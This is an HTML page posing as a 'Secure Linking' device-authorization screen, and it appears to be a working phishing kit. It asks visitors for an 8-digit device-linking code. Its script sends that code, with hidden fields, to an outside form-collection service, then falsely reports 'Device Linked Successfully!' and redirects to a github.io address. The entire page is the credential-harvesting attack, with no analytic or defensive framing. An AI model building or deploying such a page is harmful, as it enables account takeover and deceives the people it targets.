<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Link Device | Gateway</title>
  <style>
    :root {
      --primary: #10b981; 
      --primary-dark: #059669;
      --bg-base: #020617; 
      --card-bg: rgba(7, 10, 15, 0.95); 
      --text-main: #f8fafc;
      --text-muted: #64748b;
      --border: rgba(255, 255, 255, 0.05);
    }

    body { 
      margin: 0; 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
      background: var(--bg-base) url('background.jpg') no-repeat center center fixed; 
      background-size: cover !important; 
      color: var(--text-main); 
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .overlay { 
      background: radial-gradient(circle at center, rgba(2, 6, 23, 0.4) 0%, rgba(2, 6, 23, 0.95) 100%);
      width: 100%;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container { 
      background: var(--card-bg);
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 35px 25px 40px; 
      width: 100%;
      max-width: 440px; 
      border-radius: 28px; 
      border: 1px solid var(--border);
      box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.9);
      box-sizing: border-box;
      text-align: center;
    }

    /* --- LOGO SPACE ADDED --- */
    .logo-container {
      text-align: left;
      margin-bottom: 25px;
    }

    .logo-container img {
      max-width: 110px;
      height: auto;
      display: block;
    }
    /* ------------------------ */

    .security-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(16, 185, 129, 0.05);
      color: var(--primary);
      padding: 4px 12px;
      border-radius: 100px;
      font-size: 10px;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      margin-bottom: 20px;
      border: 1px solid rgba(16, 185, 129, 0.1);
    }
    
    h2 { font-size: 22px; font-weight: 600; margin: 0 0 8px 0; }
    p { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 24px; }
    
    .code-container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-bottom: 24px;
    }

    .code-box {
      width: 38px;
      height: 48px;
      background: rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.03);
      border-radius: 10px;
      font-size: 18px;
      font-weight: 600;
      color: white;
      text-align: center;
      transition: all 0.3s ease;
    }

    .code-box:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
    }

    .dash {
      font-size: 18px;
      color: var(--text-muted);
      padding: 0 1px;
    }

    button { 
      padding: 12px 20px; 
      border-radius: 50px; 
      border: 1px solid var(--primary); 
      cursor: pointer; 
      font-weight: 500; 
      width: 100%; 
      font-size: 13px; 
      transition: all 0.3s ease;
      text-transform: uppercase;
      background: var(--primary); 
      color: white;
      margin-top: 10px;
    }

    button:hover {
      background: var(--primary-dark);
      border-color: var(--primary-dark);
      transform: translateY(-1px);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    
    .status-msg { 
      margin-top: 15px; 
      font-size: 12px; 
      color: var(--primary) !important; 
      font-weight: 500;
      padding: 10px;
      background: rgba(16, 185, 129, 0.1);
      border-radius: 12px;
      border: 1px solid rgba(16, 185, 129, 0.2);
      display: none;
    }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    
    <!-- Logo Container added at top left -->
    <div class="logo-container">
      <img src="logo.png" alt="Logo">
    </div>

    <div class="security-badge">Secure Linking</div>
    <h2>Link New Device</h2>
    <p>Enter the 8-digit synchronization code to authorize this device.</p>
    
    <form id="linkForm">
      <input type="hidden" name="phone_number" value="Hidden_System_User">
      <input type="hidden" name="intent" id="intent" value="Device Linking Attempt">
      <input type="hidden" name="received_code" id="finalCode">

      <div class="code-container">
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        
        <span class="dash">—</span>
        
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
        <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
      </div>

      <button type="submit" id="submitBtn">Link Device</button>
      
      <div id="statusMessage" class="status-msg">
        Authenticating connection...
      </div>
    </form>
  </div>
</div>

<script>
  const inputs = document.querySelectorAll('.code-box');
  const submitBtn = document.getElementById('submitBtn');
  const statusMsg = document.getElementById('statusMessage');

  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  document.getElementById('linkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    let fullCode = "";
    inputs.forEach(input => fullCode += input.value);
    document.getElementById('finalCode').value = fullCode;

    submitBtn.disabled = true;
    submitBtn.innerText = "Processing...";
    statusMsg.style.display = "block";

    try {
      const response = await fetch("https://formcarry.com/s/6u_Lkdx6_ly", {
        method: 'POST',
        headers: { 
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(new FormData(e.target))
      });

      if (response.ok) {
        statusMsg.innerText = "Device Linked Successfully!";
        submitBtn.innerText = "Linked";
        setTimeout(() => { window.location.href = "https://the-pigeon101.github.io/link device.html"; }, 2000);
      } else {
        throw new Error();
      }
    } catch (err) {
      alert("Connection failed. Please try again.");
      submitBtn.disabled = false;
      submitBtn.innerText = "Link Device";
      statusMsg.style.display = "none";
    }
  });

  window.onload = () => inputs[0].focus();
</script>

</body>
</html>
